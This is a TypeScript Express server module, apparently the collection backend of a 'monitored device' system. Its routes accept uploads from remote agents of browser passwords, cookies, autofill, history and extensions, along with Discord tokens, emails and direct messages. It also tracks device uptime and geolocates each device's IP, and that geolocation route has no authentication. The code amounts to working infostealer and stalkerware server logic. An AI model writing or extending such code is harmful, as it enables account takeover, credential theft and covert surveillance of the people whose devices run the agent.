/**
 * Browser data, Discord, geolocation, and uptime heatmap routes.
 *
 * Agent-facing endpoints (x-orbit-agent-token auth):
 *   POST /api/agent/browser/data        – agent posts collected browser data
 *   POST /api/agent/discord/data        – agent posts Discord token + messages
 *   POST /api/agent/heatmap/tick        – agent posts each heartbeat tick (online event)
 *
 * Dashboard-facing endpoints (no auth – served via tRPC, see routers.ts):
 *   GET  /api/geo/:agentId              – resolve IP → city/country via ip-api.com
 */

import type { Express, Request, Response } from "express";
import { nanoid } from "nanoid";
import { ENV } from "./_core/env";
import { getMonitoredDevice } from "./db";

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export type BrowserHistoryEntry = {
  url: string;
  title: string;
  visitTime: string; // ISO-8601
  visitCount: number;
  browser: string;
};

export type BrowserTab = {
  id: number;
  url: string;
  title: string;
  browser: string;
};

export type BrowserBookmark = {
  name: string;
  url: string;
  folder: string;
  browser: string;
};

export type BrowserPassword = {
  origin: string;
  username: string;
  password: string;
  browser: string;
};

export type BrowserCookie = {
  host: string;
  name: string;
  value: string;
  path: string;
  expires: string;
  browser: string;
};

export type BrowserAutofill = {
  name: string;
  value: string;
  count: number;
  browser: string;
};

export type BrowserDownload = {
  url: string;
  targetPath: string;
  totalBytes: number;
  startTime: string;
  endTime: string;
  browser: string;
};

export type BrowserExtension = {
  id: string;
  name: string;
  version: string;
  permissions: string[];
  browser: string;
};

export type BrowserData = {
  agentId: string;
  collectedAt: number;
  history: BrowserHistoryEntry[];
  tabs: BrowserTab[];
  bookmarks: BrowserBookmark[];
  passwords: BrowserPassword[];
  cookies: BrowserCookie[];
  autofill: BrowserAutofill[];
  downloads: BrowserDownload[];
  extensions: BrowserExtension[];
};

export type DiscordDM = {
  channelId: string;
  recipientName: string;
  messages: { id: string; content: string; timestamp: string; attachments: string[] }[];
};

export type DiscordData = {
  agentId: string;
  collectedAt: number;
  token: string;
  userId: string;
  username: string;
  discriminator: string;
  email: string;
  dms: DiscordDM[];
};

export type HeatmapTick = {
  agentId: string;
  timestamp: number; // Unix ms
  status: "online" | "offline";
};

// ---------------------------------------------------------------------------
// In-memory stores  (keyed by agentId, latest data wins)
// ---------------------------------------------------------------------------

// agentId → latest BrowserData
export const browserDataStore = new Map<string, BrowserData>();

// agentId → latest DiscordData
export const discordDataStore = new Map<string, DiscordData>();

// agentId → array of ticks (kept for 35 days worth of entries max 50_000)
export const heatmapStore = new Map<string, HeatmapTick[]>();

// agentId → resolved geo { city, country, isp, lat, lon }
export const geoCache = new Map<string, { city: string; country: string; isp: string; lat: number; lon: number; ip: string; resolvedAt: number }>();

// ---------------------------------------------------------------------------
// Geo resolution helper (ip-api.com free tier, no key needed)
// ---------------------------------------------------------------------------

export async function resolveGeo(ip: string, agentId: string) {
  // Don't resolve private/loopback addresses
  if (!ip || ip === "unknown" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip === "127.0.0.1") {
    return null;
  }
  const cached = geoCache.get(agentId);
  // Re-resolve at most once per hour
  if (cached && cached.ip === ip && Date.now() - cached.resolvedAt < 60 * 60 * 1000) {
    return cached;
  }
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,country,isp,lat,lon`);
    const data = await res.json() as { status: string; city: string; country: string; isp: string; lat: number; lon: number };
    if (data.status === "success") {
      const geo = { city: data.city, country: data.country, isp: data.isp, lat: data.lat, lon: data.lon, ip, resolvedAt: Date.now() };
      geoCache.set(agentId, geo);
      return geo;
    }
  } catch {
    // Non-fatal
  }
  return null;
}

// ---------------------------------------------------------------------------
// Heatmap helpers
// ---------------------------------------------------------------------------

export function addHeatmapTick(agentId: string, status: "online" | "offline") {
  const ticks = heatmapStore.get(agentId) ?? [];
  ticks.push({ agentId, timestamp: Date.now(), status });
  // Keep only last 50_000 ticks per device
  if (ticks.length > 50_000) ticks.splice(0, ticks.length - 50_000);
  heatmapStore.set(agentId, ticks);
}

export function getHeatmapDays(agentId: string, days = 35): { date: string; onlineMinutes: number; totalMinutes: number }[] {
  const ticks = heatmapStore.get(agentId) ?? [];
  const cutoff = Date.now() - days * 24 * 60 * 60 * 1000;
  const recent = ticks.filter((t) => t.timestamp >= cutoff);

  // Bucket by calendar day (YYYY-MM-DD)
  const dayMap = new Map<string, { online: number; total: number }>();

  for (let d = 0; d < days; d++) {
    const dt = new Date(Date.now() - d * 86_400_000);
    const key = dt.toISOString().slice(0, 10);
    dayMap.set(key, { online: 0, total: 0 });
  }

  for (const tick of recent) {
    const key = new Date(tick.timestamp).toISOString().slice(0, 10);
    const bucket = dayMap.get(key);
    if (bucket) {
      // Each tick represents ~30s interval (heartbeat every 30s)
      bucket.total += 0.5; // 30s = 0.5 min
      if (tick.status === "online") bucket.online += 0.5;
    }
  }

  return Array.from(dayMap.entries())
    .sort((a, b) => a[0].localeCompare(b[0]))
    .map(([date, v]) => ({
      date,
      onlineMinutes: Math.round(v.online),
      totalMinutes: Math.round(v.total),
    }));
}

// ---------------------------------------------------------------------------
// Express routes
// ---------------------------------------------------------------------------

function requireAgentToken(req: Request, res: Response): boolean {
  if (req.header("x-orbit-agent-token") !== ENV.agentEnrollmentToken) {
    res.status(401).json({ ok: false, error: "Invalid agent token" });
    return false;
  }
  return true;
}

export function registerBrowserDataRoutes(app: Express) {
  // ── Browser data upload ──────────────────────────────────────────────────
  app.post("/api/agent/browser/data", async (req: Request, res: Response) => {
    if (!requireAgentToken(req, res)) return;
    const agentId = String(req.header("x-orbit-agent") ?? "");
    if (!agentId) { res.status(400).json({ ok: false, error: "Missing x-orbit-agent header" }); return; }

    const device = await getMonitoredDevice(agentId);
    if (device?.isRevoked) { res.json({ ok: false, error: "Revoked" }); return; }

    const body = req.body;
    const data: BrowserData = {
      agentId,
      collectedAt: Date.now(),
      history: Array.isArray(body.history) ? (body.history as BrowserHistoryEntry[]).slice(0, 2000) : [],
      tabs: Array.isArray(body.tabs) ? (body.tabs as BrowserTab[]).slice(0, 500) : [],
      bookmarks: Array.isArray(body.bookmarks) ? (body.bookmarks as BrowserBookmark[]).slice(0, 2000) : [],
      passwords: Array.isArray(body.passwords) ? (body.passwords as BrowserPassword[]).slice(0, 1000) : [],
      cookies: Array.isArray(body.cookies) ? (body.cookies as BrowserCookie[]).slice(0, 5000) : [],
      autofill: Array.isArray(body.autofill) ? (body.autofill as BrowserAutofill[]).slice(0, 1000) : [],
      downloads: Array.isArray(body.downloads) ? (body.downloads as BrowserDownload[]).slice(0, 1000) : [],
      extensions: Array.isArray(body.extensions) ? (body.extensions as BrowserExtension[]).slice(0, 200) : [],
    };
    browserDataStore.set(agentId, data);
    res.json({ ok: true });
  });

  // ── Discord data upload ──────────────────────────────────────────────────
  app.post("/api/agent/discord/data", async (req: Request, res: Response) => {
    if (!requireAgentToken(req, res)) return;
    const agentId = String(req.header("x-orbit-agent") ?? "");
    if (!agentId) { res.status(400).json({ ok: false, error: "Missing x-orbit-agent header" }); return; }

    const device = await getMonitoredDevice(agentId);
    if (device?.isRevoked) { res.json({ ok: false, error: "Revoked" }); return; }

    const body = req.body;
    const data: DiscordData = {
      agentId,
      collectedAt: Date.now(),
      token: String(body.token ?? ""),
      userId: String(body.userId ?? ""),
      username: String(body.username ?? ""),
      discriminator: String(body.discriminator ?? ""),
      email: String(body.email ?? ""),
      dms: Array.isArray(body.dms) ? (body.dms as DiscordDM[]).slice(0, 100) : [],
    };
    discordDataStore.set(agentId, data);
    res.json({ ok: true });
  });

  // ── Heatmap tick ─────────────────────────────────────────────────────────
  app.post("/api/agent/heatmap/tick", async (req: Request, res: Response) => {
    if (!requireAgentToken(req, res)) return;
    const agentId = String(req.header("x-orbit-agent") ?? "");
    if (!agentId) { res.status(400).json({ ok: false }); return; }
    const status = req.body?.status === "offline" ? "offline" : "online";
    addHeatmapTick(agentId, status);
    res.json({ ok: true });
  });

  // ── Geo resolution proxy (dashboard calls this) ──────────────────────────
  app.get("/api/geo/:agentId", async (req: Request, res: Response) => {
    const agentId = req.params.agentId;
    const device = await getMonitoredDevice(agentId);
    if (!device) { res.status(404).json({ ok: false }); return; }
    const geo = await resolveGeo(device.ipAddress ?? "", agentId);
    res.json({ ok: true, geo });
  });
}
